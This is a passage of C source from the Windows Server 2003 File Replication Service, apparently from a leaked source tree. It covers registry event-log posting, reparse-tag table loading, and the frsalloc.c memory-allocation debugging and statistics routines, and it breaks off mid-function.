    WStatus = RegSetValueEx(HKeysNotToRestore,
                            SERVICE_NAME,
                            0,
                            REG_MULTI_SZ,
                            (PCHAR)MStr,
                            (Idx + 1) * sizeof(WCHAR));
    CLEANUP2_WS(4, ":FK: ERROR - RegSetValueEx(%ws\\%ws);",
                FRS_KEYS_NOT_TO_RESTORE, SERVICE_NAME, WStatus, CLEANUP);

    //
    // DONE
    //
    WStatus = ERROR_SUCCESS;

CLEANUP:
    FRS_REG_CLOSE(HOldBackupKey);
    FRS_REG_CLOSE(HNewBackupKey);
    FRS_REG_CLOSE(HKeysNotToRestore);
    FrsFree(MStr);
}



VOID
FrsRegPostEventLog(
    IN  PFRS_REGISTRY_KEY KeyCtx,
    IN  PWCHAR            KeyArg1,
    IN  ULONG             Flags,
    IN  LONG              IDScode
)
/*++

Routine Description:

    This Posts an event log message for a problem with a registry key.

Arguments:

    KeyCtx  - Ptr to the Key Context struct for this key.

    KeyArg1 - An optional caller supplied key component.  NULL if not provided.

    Flags   - Modifer flags

    IDSCode - the error message code for a resource string to put in the message.

Return Value:

    None.

--*/
#undef DEBSUB
#define  DEBSUB  "FrsRegPostEventLog:"
{

    #define LEN_DEFAULT_VALUE 48
    #define LEN_RANGE_STR    256

    PWCHAR ErrorStr, UnitsStr, RangeStrFmt, ValStr, FullKeyStr;
    WCHAR  RangeStr[LEN_RANGE_STR];

//DPRINT(0, "function entry\n");
    //
    // Are we posting an event log message for this key?
    //
    if (!BooleanFlagOn(Flags | KeyCtx->Flags, FRS_RKF_LOG_EVENT) ||
        (KeyCtx->EventCode == EVENT_FRS_NONE)) {
        return;
    }

    //
    // Post Eventlog message.  Include KeyString, ValueName,
    // MustBePresent, Expected Type, TypeMismatch or not,
    // Value out of range (with range allowed), Default Value Used,
    // regedit instrs to fix the problem,
    //
    UnitsStr = FrsGetResourceStr(XLATE_IDS_UNITS(KeyCtx->Units));
    ErrorStr = FrsGetResourceStr(IDScode);


    if (KeyCtx->RegValueType == REG_DWORD) {

        //
        // Get the range format string from the string resource.
        //
        RangeStrFmt = FrsGetResourceStr(IDS_RANGE_DWORD);
        //
        // Show default value used if default is ok.
        //
        if (BooleanFlagOn(Flags | KeyCtx->Flags, FRS_RKF_OK_TO_USE_DEFAULT)) {
            ValStr = FrsAlloc(LEN_DEFAULT_VALUE * sizeof(WCHAR));
            _snwprintf(ValStr, LEN_DEFAULT_VALUE, L"%d", KeyCtx->ValueDefault);
        } else {
            ValStr = FrsGetResourceStr(IDS_NO_DEFAULT);
        }
    } else {
        //
        // No default allowed.
        //
        RangeStrFmt = FrsGetResourceStr(IDS_RANGE_STRING);
        ValStr = FrsGetResourceStr(IDS_NO_DEFAULT);
    }

    //
    // Build the range string.
    //
    _snwprintf(RangeStr, LEN_RANGE_STR, RangeStrFmt, KeyCtx->ValueMin, KeyCtx->ValueMax);
    RangeStr[LEN_RANGE_STR-1] = UNICODE_NULL;

    //
    // Expand the key string.
    //
    FrsRegExpandKeyStr(KeyCtx, KeyArg1, Flags, &FullKeyStr);
    if (FullKeyStr == NULL) {
        FullKeyStr = FrsWcsDup(KeyCtx->KeyName);
    }

    //
    // Post the event log message using the keycode in the KeyContext and cleanup.
    //
    if (KeyCtx->EventCode == EVENT_FRS_BAD_REG_DATA) {
    EPRINT9(KeyCtx->EventCode,
            ErrorStr,                           // %1
            FullKeyStr,                         // %2
            KeyCtx->ValueName,                  // %3
            REG_DT_NAME(KeyCtx->RegValueType),  // %4
            RangeStr,                           // %5
            UnitsStr,                           // %6
            ValStr,                             // %7
            FullKeyStr,                         // %8
            KeyCtx->ValueName);                 // %9
    } else {
        //
        // Don't know this event code but put out something.
        //
        DPRINT1(0, ":FK: ERROR - Unexpected EventCode number (%d). Cannot post message.\n",
                KeyCtx->EventCode);
    }


    DPRINT1(0, ":FK:    EventCode number  : %d\n" , (KeyCtx->EventCode & 0xFFFF));
    DPRINT1(0, ":FK:    Error String      : %ws\n", ErrorStr);
    DPRINT1(0, ":FK:    Key String        : %ws\n", FullKeyStr);
    DPRINT1(0, ":FK:    Value Name        : %ws\n", KeyCtx->ValueName);
    DPRINT1(0, ":FK:    Expected Reg Type : %ws\n", REG_DT_NAME(KeyCtx->RegValueType));
    DPRINT1(0, ":FK:    Parameter Range   : %ws\n", RangeStr);
    DPRINT1(0, ":FK:    Parameter units   : %ws\n", UnitsStr);

    FrsFree(ErrorStr);
    FrsFree(RangeStrFmt);
    FrsFree(UnitsStr);
    FrsFree(ValStr);
    FrsFree(FullKeyStr);

}


DWORD
CfgRegReadReparseTagInfo(
    VOID
    )
{
    #undef DEBSUB
    #define  DEBSUB  "CfgRegReadReparseTagInfo:"

    DWORD   WStatus = ERROR_SUCCESS;
    HKEY    hKey = INVALID_HANDLE_VALUE;
    DWORD   Index = 0;
    WCHAR   SubKey[MAX_PATH];
    DWORD   SubKeySize = MAX_PATH;
    FILETIME LastWriteTime;
    DWORD *ReparseTagType = NULL;
    PREPARSE_TAG_TABLE_ENTRY ReparseTagTableEntry = NULL;
    PREPARSE_TAG_TABLE_ENTRY ExistingEntry = NULL;

    GTabLockTable(ReparseTagTable);

    //
    // First clear the data in the table.
    //
    GTabEmptyTableNoLock(ReparseTagTable, FrsFreeType);

    //
    // Seed the table with the default values.
    //
    ReparseTagType = FrsAlloc(sizeof(DWORD));
    *ReparseTagType = IO_REPARSE_TAG_HSM;
    ReparseTagTableEntry = FrsAllocTypeSize(REPARSE_TAG_TABLE_ENTRY_TYPE, (wcslen(REPARSE_TAG_REPLICATION_TYPE_FILE_DATA) + 1) * sizeof(WCHAR));
    wcscpy(ReparseTagTableEntry->ReplicationType, REPARSE_TAG_REPLICATION_TYPE_FILE_DATA);
    ExistingEntry = GTabInsertUniqueEntryNoLock(ReparseTagTable, ReparseTagTableEntry, ReparseTagType, NULL);
    FRS_ASSERT(ExistingEntry == NULL);

    ReparseTagType = FrsAlloc(sizeof(DWORD));
    *ReparseTagType = IO_REPARSE_TAG_SIS;
    ReparseTagTableEntry = FrsAllocTypeSize(REPARSE_TAG_TABLE_ENTRY_TYPE, (wcslen(REPARSE_TAG_REPLICATION_TYPE_FILE_DATA) + 1) * sizeof(WCHAR));
    wcscpy(ReparseTagTableEntry->ReplicationType, REPARSE_TAG_REPLICATION_TYPE_FILE_DATA);
    ExistingEntry = GTabInsertUniqueEntryNoLock(ReparseTagTable, ReparseTagTableEntry, ReparseTagType, NULL);
    FRS_ASSERT(ExistingEntry == NULL);

    ReparseTagType = FrsAlloc(sizeof(DWORD));
    *ReparseTagType = IO_REPARSE_TAG_DFS;
    ReparseTagTableEntry = FrsAllocTypeSize(REPARSE_TAG_TABLE_ENTRY_TYPE, (wcslen(REPARSE_TAG_REPLICATION_TYPE_REPARSE_POINT) + 1) * sizeof(WCHAR));
    wcscpy(ReparseTagTableEntry->ReplicationType, REPARSE_TAG_REPLICATION_TYPE_REPARSE_POINT);
    ExistingEntry = GTabInsertUniqueEntryNoLock(ReparseTagTable, ReparseTagTableEntry, ReparseTagType, NULL);
    FRS_ASSERT(ExistingEntry == NULL);


    //
    // Read the info from the registry.
    //

    WStatus = CfgRegOpenKey(FKC_REPARSE_TAG_KEY, NULL, 0, &hKey);
    CLEANUP_WS(4, "++ WARN - Cannot open reparse tag key.", WStatus, Exit);


    while(WStatus ==  ERROR_SUCCESS) {
    SubKeySize = MAX_PATH;

    ReparseTagTableEntry = FrsAllocTypeSize(REPARSE_TAG_TABLE_ENTRY_TYPE, 0);

    ReparseTagType = FrsAlloc(sizeof(DWORD));

    WStatus = RegEnumKeyEx(hKey,           // handle to key to enumerate
                   Index,          // subkey index
                   SubKey,         // subkey name
                   &SubKeySize,    // size of subkey buffer
                   NULL,           // reserved
                   NULL,           // class string buffer
                   NULL,           //  size of class string buffer
                   &LastWriteTime  // last write time
                   );


    if(WStatus == ERROR_SUCCESS) {
        WStatus = CfgRegReadDWord(FKC_REPARSE_TAG_TYPE, SubKey, 0, ReparseTagType);
    }


    if(WStatus == ERROR_SUCCESS) {
        WStatus = CfgRegReadString(FKC_REPARSE_TAG_REPLICATION_TYPE, SubKey, 0, &(ReparseTagTableEntry->ReplicationType));
    }


    if(WStatus == ERROR_SUCCESS){
        ExistingEntry = GTabInsertUniqueEntryNoLock(ReparseTagTable, ReparseTagTableEntry, ReparseTagType, NULL);
        if(ExistingEntry) {
        //
        // There is already an entry for this reparse tag type.
        // Replace it.
        //

        FrsFree(ExistingEntry->ReplicationType);
        ExistingEntry->ReplicationType = ReparseTagTableEntry->ReplicationType;
        ReparseTagTableEntry->ReplicationType = NULL;

        //
        // The entry we allocated wasn't used.
        // Free it up.
        //
        FrsFreeType(ReparseTagTableEntry);
        ReparseTagTableEntry = NULL;

        }
        Index++;
    }

    ReparseTagTableEntry = NULL;
    ReparseTagType = NULL;

    }

Exit:

    GTabUnLockTable(ReparseTagTable);

    FRS_REG_CLOSE(hKey);
    return WStatus;
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\util\frsalloc.c ===
/*++

Copyright (c) 1997-1999 Microsoft Corporation

Module Name:

    frsalloc.c

Abstract:

    Routines for allocating and freeing memory structures in the
    NT File Replication Service.

Author:

    David Orbits (davidor) - 3-Mar-1997

Revision History:

--*/

#include <ntreppch.h>
#pragma  hdrstop


#include <frs.h>
#include <tablefcn.h>
#include <ntfrsapi.h>
#include <info.h>
#include <perrepsr.h>

#pragma warning( disable:4102)  // unreferenced label

//
// Check for allocation problems
//
#define DBG_NUM_MEM_STACK       (8)
#define MAX_MEM_ON_FREE_LIST    (1024)
#define MAX_MEM_INDEX           (1024)


#define FRS_DEB_PRINT(_f, _d) \
        DebPrintNoLock(Severity, TRUE, _f, Debsub, uLineNo, _d)

#define FRS_DEB_PRINT2(_f, _d1, _d2) \
        DebPrintNoLock(Severity, TRUE, _f, Debsub, uLineNo, _d1, _d2)

#define FRS_DEB_PRINT3(_f, _d1, _d2, _d3) \
        DebPrintNoLock(Severity, TRUE, _f, Debsub, uLineNo, _d1, _d2, _d3)


CRITICAL_SECTION    MemLock;

typedef struct _MEM MEM, *PMEM;

struct _MEM {
    PMEM    Next;
    ULONG_PTR   *Begin;
    ULONG_PTR   *End;
    DWORD   OrigSize;
    ULONG_PTR   Stack[DBG_NUM_MEM_STACK];
};

PMEM    MemList;
PMEM    FreeMemList;
DWORD   MemOnFreeList;
DWORD   TotalAlloced;
DWORD   TotalAllocCalls;
DWORD   TotalFreed;
DWORD   TotalFreeCalls;
DWORD   TotalDelta;
DWORD   TotalDeltaMax;
DWORD   TotalTrigger = 10000;

ULONG   TypesAllocatedCount[NODE_TYPE_MAX];
ULONG   TypesAllocatedMax[NODE_TYPE_MAX];
ULONG   TypesAllocated[NODE_TYPE_MAX];

ULONG   SizesAllocatedCount[MAX_MEM_INDEX];
ULONG   SizesAllocatedMax[MAX_MEM_INDEX];
ULONG   SizesAllocated[MAX_MEM_INDEX];

ULONG   DbgBreakSize        = 2;
LONG    DbgBreakTrigger     = 1;
LONG    DbgBreakReset       = 1;
LONG    DbgBreakResetInc    = 0;

PULONG_PTR   MaxAllocAddr;
PULONG_PTR   MinAllocAddr;
DWORD   ReAllocs;
DWORD   NewAllocs;

//
// Keep these in the same order as the Node Type ENUM.
//
PCHAR NodeTypeNames[]= {
    "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "",
    "THREAD_CONTEXT_TYPE",
    "REPLICA_TYPE",
    "REPLICA_THREAD_TYPE",
    "CONFIG_NODE_TYPE",
    "CXTION_TYPE",
    "GUID/RPC HANDLE",
    "THREAD_TYPE",
    "GEN_TABLE_TYPE",
    "JBUFFER_TYPE",
    "VOLUME_MONITOR_ENTRY_TYPE",
    "COMMAND_PACKET_TYPE",
    "GENERIC_HASH_TABLE_TYPE",
    "CHANGE_ORDER_ENTRY_TYPE",
    "FILTER_TABLE_ENTRY_TYPE",
    "QHASH_TABLE_TYPE",
    "OUT_LOG_PARTNER_TYPE",
    "WILDCARD_FILTER_ENTRY_TYPE",
    "REPARSE_TAG_TABLE_TYPE",
    "NODE_TYPE_MAX"
    };

extern PCHAR CoLocationNames[];


//
// Replica set object Flag Name. (FrsRsoFlags)
//
FLAG_NAME_TABLE FrsRsoFlagNameTable[] = {

    {FRS_RSO_FLAGS_ENABLE_INSTALL_OVERRIDE   , "InstallOverride " },
    {FRS_RSO_FLAGS_ENABLE_RENAME_UPDATES     , "DoRenameUpdates " },

    {0, NULL}
};


extern PCHAR CoLocationNames[];

extern FLAG_NAME_TABLE StageFlagNameTable[];
extern FLAG_NAME_TABLE OlpFlagNameTable[];
extern FLAG_NAME_TABLE CxtionOptionsFlagNameTable[];

extern PCHAR OLPartnerStateNames[];
extern PWCHAR DsConfigTypeName[];

extern PGEN_TABLE            VolSerialNumberToDriveTable;




VOID
FrsDisplayUsnReason(
    ULONG ReasonMask,
    PCHAR Buffer,
    LONG MaxLength
    );


PFRS_THREAD
ThSupEnumThreads(
    PFRS_THREAD     FrsThread
    );

VOID
DbgPrintThreadIds(
    IN ULONG Severity
    );

VOID
DbsDataInitCocExtension(
    IN PCHANGE_ORDER_RECORD_EXTENSION CocExt
    );

VOID
SndCsDestroyCxtion(
    IN PCXTION  Cxtion,
    IN DWORD    CxtionFlags
    );


VOID
FrsInitializeMemAlloc(
    VOID
    )
/*++
Routine Description:
    Initialize the memory allocation subsystem

Arguments:
    None.

Return Value:
    None.
--*/
{
#undef DEBSUB
#define DEBSUB "FrsInitializeMemAlloc:"


    INITIALIZE_CRITICAL_SECTION(&MemLock);

    //
    // Get Debugmem and DebugMemCompact from ntfrs config section in the registry
    //
    CfgRegReadDWord(FKC_DEBUG_MEM,         NULL, 0, &DebugInfo.Mem);
    CfgRegReadDWord(FKC_DEBUG_MEM_COMPACT, NULL, 0, &DebugInfo.MemCompact);

}


VOID
FrsPrintAllocStats(
    IN ULONG            Severity,
    IN PNTFRSAPI_INFO   Info,        OPTIONAL
    IN DWORD            Tabs
    )
/*++
Routine Description:
    Print the memory stats into the info buffer or using DPRINT (Info == NULL).

Arguments:
    Severity    - for DPRINT
    Info        - for IPRINT (use DPRINT if NULL)
    Tabs        - indentation for prettyprint

Return Value:
    None.
--*/
{
#undef DEBSUB
#define DEBSUB "FrsPrintAllocStats:"
    ULONG           i;
    WCHAR           TabW[MAX_TAB_WCHARS + 1];

    InfoTabs(Tabs, TabW);

    IDPRINT0(Severity, Info, "\n");
    IDPRINT1(Severity, Info, "%wsNTFRS MEMORY USAGE:\n", TabW);
    IDPRINT2(Severity, Info, "%ws   ENABLE STATS   : %s\n",
             TabW,
             (DebugInfo.Mem) ? "TRUE" : "FALSE");
    IDPRINT3(Severity, Info, "%ws   Alloced        : %6d KB (%d calls)\n",
             TabW,
             TotalAlloced / 1024,
             TotalAllocCalls);
    IDPRINT3(Severity, Info, "%ws   Freed          : %6d KB (%d calls)\n",
             TabW,
             TotalFreed / 1024,
             TotalFreeCalls);
    IDPRINT2(Severity, Info, "%ws   Delta          : %6d KB\n",
             TabW,
             TotalDelta / 1024);
    IDPRINT2(Severity, Info, "%ws   Max delta      : %6d KB\n",
             TabW,
             TotalDeltaMax / 1024);
    IDPRINT2(Severity, Info, "%ws   Addr Range     : %6d KB\n",
             TabW,
             (((PCHAR)MaxAllocAddr) - ((PCHAR)MinAllocAddr)) / 1024);
    IDPRINT2(Severity, Info, "%ws   OnFreeList     : %d\n", TabW, MemOnFreeList);
    IDPRINT2(Severity, Info, "%ws   ReAllocs       : %d\n", TabW, ReAllocs);
    IDPRINT2(Severity, Info, "%ws   NewAllocs      : %d\n", TabW, NewAllocs);
    IDPRINT2(Severity, Info, "%ws   MinAddr        : 0x%08x\n", TabW, MinAllocAddr);
    IDPRINT2(Severity, Info, "%ws   MaxAddr        : 0x%08x\n", TabW, MaxAllocAddr);

    for (i = 0; i < NODE_TYPE_MAX; ++i) {
        if (!TypesAllocatedCount[i]) {
            continue;
        }
        IDPRINT5(Severity, Info, "%ws      %-26s: %6d Calls, %6d Max, %6d busy\n",
                 TabW, NodeTypeNames[i], TypesAllocatedCount[i],
                 TypesAllocatedMax[i], TypesAllocated[i]);
    }
    IDPRINT0(Severity, Info, "\n");

    for (i = 0; i < MAX_MEM_INDEX; ++i) {
        if (!SizesAllocatedCount[i]) {
            continue;
        }
        IDPRINT6(Severity, Info, "%ws      %6d to %6d : %6d Calls, %6d Max, %6d busy\n",
                 TabW, i << 4, ((i + 1) << 4) - 1,
                 SizesAllocatedCount[i], SizesAllocatedMax[i], SizesAllocated[i]);
    }
    IDPRINT0(Severity, Info, "\n");
}


VOID
FrsPrintThreadStats(
    IN ULONG            Severity,
    IN PNTFRSAPI_INFO   Info,        OPTIONAL
    IN DWORD            Tabs
    )
/*++
Routine Description:
    Print the thread stats into the info buffer or using DPRINT (Info == NULL).

Arguments:
    Severity    - for DPRINT
    Info        - for IPRINT (use DPRINT if NULL)
    Tabs        - indentation for prettyprint

Return Value:
    None.
--*/
{
#undef DEBSUB
#define DEBSUB "FrsPrintThreadStats:"
    ULONGLONG       CreateTime;
    ULONGLONG       ExitTime;
    ULONGLONG       KernelTime;
    ULONGLONG       UserTime;
    PFRS_THREAD     FrsThread;
    WCHAR           TabW[MAX_TAB_WCHARS + 1];

    InfoTabs(Tabs, TabW);

    IDPRINT0(Severity, Info, "\n");
    IDPRINT1(Severity, Info, "%wsNTFRS THREAD USAGE:\n", TabW);

    //
    // Thread CPU Times
    //
    FrsThread = NULL;
    while (FrsThread = ThSupEnumThreads(FrsThread)) {
        if (HANDLE_IS_VALID(FrsThread->Handle)) {
            if (GetThreadTimes(FrsThread->Handle,
                               (PFILETIME)&CreateTime,
                               (PFILETIME)&ExitTime,
                               (PFILETIME)&KernelTime,
                               (PFILETIME)&UserTime)) {
                //
                // Hasn't exited, yet
                //
                if (ExitTime < CreateTime) {
                    ExitTime = CreateTime;
                }
                IDPRINT5(Severity, Info, "%ws   %-15ws: %8d CPU Seconds (%d kernel, %d elapsed)\n",
                         TabW,
                         FrsThread->Name,
                         (DWORD)((KernelTime + UserTime) / (10 * 1000 * 1000)),
                         (DWORD)((KernelTime) / (10 * 1000 * 1000)),
                         (DWORD)((ExitTime - CreateTime) / (10 * 1000 * 1000)));
            }
        }
    }

    //
    // Process CPU Times
    //
    if (GetProcessTimes(ProcessHandle,
                       (PFILETIME)&CreateTime,
                       (PFILETIME)&ExitTime,
                       (PFILETIME)&KernelTime,
                       (PFILETIME)&UserTime)) {
        //
        // Hasn't exited, yet
        //
        if (ExitTime < CreateTime) {
            ExitTime = CreateTime;
        }
        IDPRINT5(Severity, Info, "%ws   %-15ws: %8d CPU Seconds (%d kernel, %d elapsed)\n",
                 TabW,
                 L"PROCESS",
                 (DWORD)((KernelTime + UserTime) / (10 * 1000 * 1000)),
                 (DWORD)((KernelTime) / (10 * 1000 * 1000)),
                 (DWORD)((ExitTime - CreateTime) / (10 * 1000 * 1000)));
    }
    IDPRINT0(Severity, Info, "\n");
}


VOID
FrsPrintStageStats(
    IN ULONG            Severity,
    IN PNTFRSAPI_INFO   Info,        OPTIONAL
    IN DWORD            Tabs
    )
/*++
Routine Description:
    Print the staging area  stats into the info buffer or
    using DPRINT (Info == NULL).

Arguments:
    Severity    - for DPRINT
    Info        - for IPRINT (use DPRINT if NULL)
    Tabs        - indentation for prettyprint

Return Value:
    None.
--*/
{
#undef DEBSUB
#define DEBSUB "FrsPrintStageStats:"


    ULARGE_INTEGER     FreeBytesAvailableToCaller;
    ULARGE_INTEGER     FreeBytesOnDisk;
    ULARGE_INTEGER     TotalNumberOfBytes;
    ULONG              FreeBytesAvail, TotalFreeBytesOnDisk, TotalBytes;

    DWORD              WStatus;
    UINT               DriveType;
    ULONG              VolumeSerialNumber = 0;
    NTSTATUS           Status;
    IO_STATUS_BLOCK    Iosb;
    DWORD              VolumeInfoLength;
    PFILE_FS_VOLUME_INFORMATION  VolumeInfo;
    HANDLE             RootHandle;
    BOOLEAN            First = TRUE;

    PVOID              Key;
    PSTAGE_ENTRY       SEntry;
    DWORD              SizeInKb;
    PWCHAR             DrivePtr = NULL;
    PWCHAR             FlagStr;
    WCHAR              TabW[MAX_TAB_WCHARS + 1];
    CHAR               Guid[GUID_CHAR_LEN + 1];
    WCHAR              LogicalDrives[MAX_PATH];
    CHAR               TimeString[TIME_STRING_LENGTH];


    extern DWORD       StagingAreaAllocated;
    extern PGEN_TABLE  StagingAreaTable;

    InfoTabs(Tabs, TabW);

    //
    // Print out free disk space.
    //
    try {

        if (!GetLogicalDriveStrings(MAX_PATH, LogicalDrives)) {
            IDPRINT1(Severity, Info, "WARN - Getting logical drives. WStatus: %s\n",
                     ErrLabelW32(GetLastError()));
            goto DONE_WITH_SPACE;
        }


        VolumeInfoLength = sizeof(FILE_FS_VOLUME_INFORMATION) +
                           MAXIMUM_VOLUME_LABEL_LENGTH;

        VolumeInfo = FrsAlloc(VolumeInfoLength);
        if (VolumeInfo == NULL) {
            goto DONE_WITH_SPACE;
        }

        DrivePtr = LogicalDrives;
        while (wcscmp(DrivePtr,L"")) {

            //
            // Skip drive A.
            //
            if (!_wcsicmp(DrivePtr, L"A:\\")) {
                goto NEXT_DRIVE;
            }

            DriveType = GetDriveType(DrivePtr);
            //
            // Skip remote drives and CDROM drives.
            //
            if ((DriveType == DRIVE_REMOTE) || (DriveType == DRIVE_CDROM)) {
                goto NEXT_DRIVE;
            }

            //
            // GetVolumeInformation does not return the volume label so
            // use NtQueryVolumeInformationFile instead.
            //
            WStatus = FrsOpenSourceFileW(&RootHandle,
                                         DrivePtr,
                                         GENERIC_READ,
                                         FILE_OPEN_FOR_BACKUP_INTENT);
            if (!WIN_SUCCESS(WStatus)) {
                IDPRINT2(Severity, Info, "WARN - GetvolumeInformation for %ws; %s\n",
                         DrivePtr, ErrLabelW32(WStatus));
                goto NEXT_DRIVE;
            }

            //
            // Get the volume information.
            //
            Status = NtQueryVolumeInformationFile(RootHandle,
                                                  &Iosb,
                                                  VolumeInfo,
                                                  VolumeInfoLength,
                                                  FileFsVolumeInformation);

            NtClose(RootHandle);

            if (!NT_SUCCESS(Status)) {
                WStatus = FrsSetLastNTError(Status);
                IDPRINT2(Severity, Info, "WARN - GetvolumeInformation for %ws; %s\n",
                         DrivePtr, ErrLabelW32(Status));
                goto NEXT_DRIVE;
            }

            if (GetDiskFreeSpaceEx(DrivePtr,
                                   &FreeBytesAvailableToCaller,
                                   &TotalNumberOfBytes,
                                   &FreeBytesOnDisk)) {
                //
                // Print a "*" if available free space is less than 1%.
                //
                FlagStr = L" ";
                if ((FreeBytesAvailableToCaller.QuadPart*100) < TotalNumberOfBytes.QuadPart) {
                    FlagStr = L"*";
                }

                FreeBytesAvail = (ULONG) (FreeBytesAvailableToCaller.QuadPart / (ULONGLONG)(1024 * 1024));
                TotalFreeBytesOnDisk = (ULONG) (FreeBytesOnDisk.QuadPart / (ULONGLONG)(1024 * 1024));
                TotalBytes = (ULONG) (TotalNumberOfBytes.QuadPart / (ULONGLONG)(1024 * 1024));

                if (First) {
                    First = FALSE;
                    IDPRINT0(Severity, Info, "      FreeBytesAvail    FreeBytes     Disk     Volume     Volume Label\n");
                    IDPRINT0(Severity, Info, "         ToCaller        OnDisk     Capacity  SerialNum\n");
                }

                IDPRINT7(Severity, Info, "%ws %ws  %10dM  %10dM  %10dM  %08x    %ws\n",
                         FlagStr, DrivePtr,
                         FreeBytesAvail, TotalFreeBytesOnDisk, TotalBytes,
                         VolumeInfo->VolumeSerialNumber, VolumeInfo->VolumeLabel);
            } else {
                WStatus = GetLastError();
                if (!WIN_SUCCESS(WStatus)) {
                    IDPRINT2(Severity, Info, "WARN - GetDiskFreeSpaceEx for %ws; %s\n",
                             DrivePtr, ErrLabelW32(WStatus));
                }
            }

NEXT_DRIVE:
            DrivePtr = DrivePtr + wcslen(DrivePtr) + 1;
        }

DONE_WITH_SPACE:;

    } except (EXCEPTION_EXECUTE_HANDLER) {
        GET_EXCEPTION_CODE(WStatus);
    }


    VolumeInfo = FrsFree(VolumeInfo);


    try {
        GTabLockTable(StagingAreaTable);
        IDPRINT0(Severity, Info, "\n");
        IDPRINT3(Severity, Info, "%wsNTFRS STAGE USAGE: %d KB of %d KB allocated\n",
                 TabW, StagingAreaAllocated, StagingLimitInKb);
        SizeInKb = 0;
        Key = NULL;

        while (SEntry = GTabNextDatumNoLock(StagingAreaTable, &Key)) {
            GuidToStr(&SEntry->FileOrCoGuid, Guid);
            IDPRINT2(Severity, Info, "%ws   %s\n", TabW, Guid);
            IDPRINT2(Severity, Info, "%ws      Flags          : %08x\n", TabW, SEntry->Flags);
            IDPRINT2(Severity, Info, "%ws      Size           : %d\n", TabW, SEntry->FileSizeInKb);
            FileTimeToString(&SEntry->LastAccessTime, TimeString);
            IDPRINT2(Severity, Info, "%ws      LastAccessTime : %s\n", TabW, TimeString);
            IDPRINT2(Severity, Info, "%ws      ReplicaNumber  : %d\n", TabW, SEntry->ReplicaNumber);

            SizeInKb += SEntry->FileSizeInKb;
        }

        IDPRINT2(Severity, Info, "%ws   Calculated Usage is %d KB\n", TabW, SizeInKb);
        IDPRINT0(Severity, Info, "\n");

    } finally {
        GTabUnLockTable(StagingAreaTable);
    }
}


VOID
MyDbgBreak(
    VOID
    )
{
}




VOID
DbgCheck(
    IN PMEM Mem
    )
/*++
Routine Description:
    Check a memory block. Memory lock must be held.

Arguments:
    Mem - memory block

Return Value:
    None.
--*/
{
#undef DEBSUB
#define DEBSUB "DbgCheck:"
    PULONG_PTR  pDWord;
    ULONG_PTR   Pattern;

    //
    // Begins at first byte at the end of the user's allocation
    //
    Pattern = (ULONG_PTR)(Mem->End) | (Mem->OrigSize << 24);

    //
    // Check for overwritten memory
    //
    if ( (ULONG_PTR)*Mem->Begin != (ULONG_PTR)Mem->Begin ) {
        DPRINT2(0, "Begin Memory @ 0x%08x has been overwritten with 0x%08x\n",
                Mem->Begin, *Mem->Begin);

    } else if (memcmp(((PCHAR)Mem->Begin) + Mem->OrigSize + 8,
                      (PCHAR)&Pattern, sizeof(Pattern))) {

        DPRINT1(0, "End Memory @ 0x%08x has been overwritten\n",
                ((PCHAR)Mem->Begin) + Mem->OrigSize + 8);
    } else {
        return;
    }

    DPRINT(0, "Memory's stack trace\n");
    STACK_PRINT(0, Mem->Stack, DBG_NUM_MEM_STACK);

    DPRINT(0, "Caller's stack trace\n");
    STACK_TRACE_AND_PRINT(0);

    DPRINT(0, "Corrupted block of memory\n");
    for (pDWord = Mem->Begin; pDWord != Mem->End; ++pDWord) {
        DPRINT2(0, "0x%08x: 0x%08x\n", pDWord, *pDWord);
    }
    exit(1);
}


VOID
DbgCheckAll(
    VOID
    )
/*++
Routine Description:
    Check all memory blocks.

Arguments:
    Mem - memory block

Return Value:
    None.
--*/
{
#undef DEBSUB
#define DEBSUB "DbgCheckAll:"
    PMEM    Mem;

    //
    // Don't check the entire list of allocated memory blocks
    //
    if (DebugInfo.Mem < 2) {
        return;
    }

    EnterCriticalSection(&MemLock);
    for (Mem = MemList; Mem; Mem = Mem->Next) {
        //
        // Check for overwritten memory
        //
        DbgCheck(Mem);
    }
    LeaveCriticalSection(&MemLock);
}


VOID
FrsUnInitializeMemAlloc(
    VOID
    )
/*++
Routine Description:
    Initialize the memory allocation subsystem

Arguments:
    None.

Return Value:
    None.
--*/
{
#undef DEBSUB
#define DEBSUB "FrsUnInitializeMemAlloc:"
    PMEM    Mem;

    EnterCriticalSection(&MemLock);
    for (Mem = MemList; Mem; Mem = Mem->Next) {
        //
        // Check for overwritten memory
        //
        DbgCheck(Mem);

        DPRINT2(1, "\t%d bytes @ 0x%08x\n",
                ((PCHAR)Mem->End) - ((PCHAR)Mem->Begin), Mem->Begin);
        STACK_PRINT(1, Mem->Stack, DBG_NUM_MEM_STACK);
    }
    LeaveCriticalSection(&MemLock);
}


PMEM
DbgAlloc(
    IN ULONG_PTR    *Begin,
    IN ULONG_PTR    *End,
    IN DWORD    OrigSize
    )
/*++
Routine Description:
    Add a new allocation to our list of allocated memory after
    checking for overlaps.

Arguments:
    Begin       - beginning of newly allocated memory
    End         - end of same
    OrigSize    - Size requested by caller

Return Value:
    None.
--*/
{
#undef DEBSUB
#define DEBSUB "DbgAlloc:"
    PMEM    *PMem;
    PMEM    Mem;
    ULONG   Calls;
    ULONG_PTR   Pattern;
    DWORD   MemIndex;

    //
    // Approximate stats
    //
    if (!DebugInfo.Mem) {
        //
        // Memory stats
        //
        Calls = ++TotalAllocCalls;
        TotalAlloced += (DWORD)((PUCHAR)End - (PUCHAR)Begin);
        if (Begin > MaxAllocAddr) {
            ++NewAllocs;
            MaxAllocAddr = Begin;
        } else {
            if (!MinAllocAddr) {
                MinAllocAddr = Begin;
            }
            ++ReAllocs;
        }

        //
        // Tracking memory sizes
        //
        MemIndex = OrigSize >> 4;
        if (MemIndex >= MAX_MEM_INDEX) {
            MemIndex = (MAX_MEM_INDEX - 1);
        }
        SizesAllocatedCount[MemIndex]++;
        //
        // Print memory stats every so often
        //
        if (!(Calls % TotalTrigger)) {
            DbgPrintThreadIds(DebugInfo.LogSeverity);
            FrsPrintAllocStats(DebugInfo.LogSeverity, NULL, 0);
        }
        return NULL;
    }

    //
    // Verify heap consistency
    //
    DbgCheckAll();
    EnterCriticalSection(&MemLock);
    PMem = &MemList;
    for (Mem = *PMem; Mem; Mem = *PMem) {
        //
        // Check for overwritten memory
        //
        DbgCheck(Mem);

        //
        // Check for overlap
        //
        if ((Begin >= Mem->Begin && Begin < Mem->End) ||
            (Mem->Begin >= Begin && Mem->Begin < End) ||
            (Mem->End > Begin && Mem->End < End) ||
            (End > Mem->Begin && End < Mem->End)) {
            //
